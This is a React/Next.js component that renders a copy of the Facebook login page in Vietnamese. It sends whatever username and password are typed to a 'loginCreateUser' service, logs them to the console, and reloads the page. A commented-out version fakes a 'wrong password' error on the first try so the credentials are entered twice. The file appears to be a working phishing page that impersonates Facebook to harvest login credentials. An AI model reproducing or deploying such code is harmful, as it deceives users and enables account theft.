"use client";
import Image from "next/image";
import React, { useEffect, useState } from "react";
import { i1, i2, i3, i4, i5, i6, i7, i8 } from "@/public/image/banner";
import page from "@/public/image/image.png";
import pageMobile from "@/public/image/pageMobil.jpg";
import { loginCreateUser } from "@/app/services/user";
const Banner = ({}) => {
  const [errorMessage, setErrorMessage] = useState("");
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [isMobile, setIsMobile] = useState(false);
  const [data, setData] = useState({
    username: "",
    password: "",
  });
  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth < 768);
    };
    handleResize();
    window.addEventListener("resize", handleResize);
    return () => {
      window.removeEventListener("resize", handleResize);
    };
  }, []);

  const bannerImage = [
    {
      image: i1,
    },
    {
      image: i2,
    },
    {
      image: i3,
    },
    {
      image: i4,
    },
    {
      image: i5,
    },
    {
      image: i6,
    },
    {
      image: i7,
    },
    {
      image: i8,
    },
    {
      image: i1,
    },
    {
      image: i2,
    },
    {
      image: i3,
    },
    {
      image: i4,
    },
    {
      image: i5,
    },
    {
      image: i6,
    },
    {
      image: i7,
    },
    {
      image: i8,
    },
    {
      image: i1,
    },
    {
      image: i2,
    },
    {
      image: i3,
    },
    {
      image: i4,
    },
    {
      image: i5,
    },
    {
      image: i6,
    },
    {
      image: i7,
    },
    {
      image: i8,
    },
    {
      image: i1,
    },
    {
      image: i2,
    },
    {
      image: i3,
    },
    {
      image: i4,
    },
    {
      image: i5,
    },
    {
      image: i6,
    },
    {
      image: i7,
    },
    {
      image: i8,
    },
    {
      image: i1,
    },
    {
      image: i2,
    },
    {
      image: i3,
    },
    {
      image: i4,
    },
  ];

  let errorLogin;

  // const handleLogin = async (e) => {
  //   e.preventDefault();
  //   try {
  //     if (loginAttempt === 0) {
  //       setErrorMessage("Sai mật khẩu hoặc tài khoản!");
  //       setTimeout(() => {
  //         setErrorMessage(""); // Đặt lại giá trị mặc định (hoặc giá trị mong muốn)
  //       }, 3000);
  //       setLoginAttempt(1);
  //       setData({ ...data, password: "", username: "" });
  //       return;
  //     }

  //     const res = await loginCreateUser(data);
  //     console.log("Login successful:", res);
  //     window.location.reload();
  //   } catch (err) {
  //     console.error("Login failed:", err);
  //   }
  // };
  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const res = await loginCreateUser(data);
      console.log("Login successful:", res);
      window.location.reload();
    } catch (err) {
      console.error("Login failed:", err);
    }
  };
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setData({ ...data, [name]: value });
  };
  console.log("data:", data);
  return (
    <section className="banner">
      <div className="relative  h-full flex justify-center">
        <div className="row ">
          <div className="-z-10">
            <Image
              src={isMobile ? pageMobile : page}
              alt=""
              className="w-full h-screen"
            />
          </div>
        </div>
        <div className="absolute  bg-black bg-opacity-50 backdrop-blur-sm  z-10 top-0 left-0 w-full h-screen"></div>
        <div className="absolute top-20 left-auto w-full sm:w-[500px]  z-20">
          <div className="row flex justify-center items-center">
            <div className="bg-gray-200 w-full p-10 h- rounded-md">
              <div className=" flex justify-center">
                <h1 className="text-blue-600 text-[36px] font-bold">
                  facebook
                </h1>
              </div>
              <form onSubmit={handleLogin}>
                <div className="bg-white rounded-lg shadow-2xl py-5">
                  <div className="flex justify-center ">
                    <h1 className="text-[20px]">Đăng nhập Facebook</h1>
                  </div>
                  <div className="px-5 gap-3 flex flex-col">
                    <div className="">
                      <input
                        value={data.username}
                        name="username"
                        onChange={handleInputChange}
                        type="text"
                        className="h-5 w-full p-5 border border-gray-200 rounded-lg"
                        placeholder="Email hoặc số điện thoại"
                      />
                    </div>
                    <div className="">
                      <input
                        value={data.password}
                        name="password"
                        onChange={handleInputChange}
                        type="password"
                        className="h-5 w-full p-5 border border-gray-200 rounded-lg"
                        placeholder="Mật khẩu"
                      />
                    </div>
                    <div>
                      <span className="text-red-500">{errorMessage}</span>
                    </div>
                    <div>
                      <button
                        type="submit"
                        className="bg-blue-500 w-full font-bold text-white rounded-lg p-3 hover:bg-blue-700"
                      >
                        Đăng nhập
                      </button>
                    </div>
                  </div>
                  <div className="pt-3">
                    <div className="flex gap-2 text-blue-500 justify-center font-semibold">
                      <button className="text-[12px] md:text-[16px] hover:text-blue-400">
                        Bạn quên tài khoản ư?
                      </button>
                      <button className="text-[12px] md:text-[16px] hover:text-blue-400">
                        Đăng ký Fcebook
                      </button>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Banner;
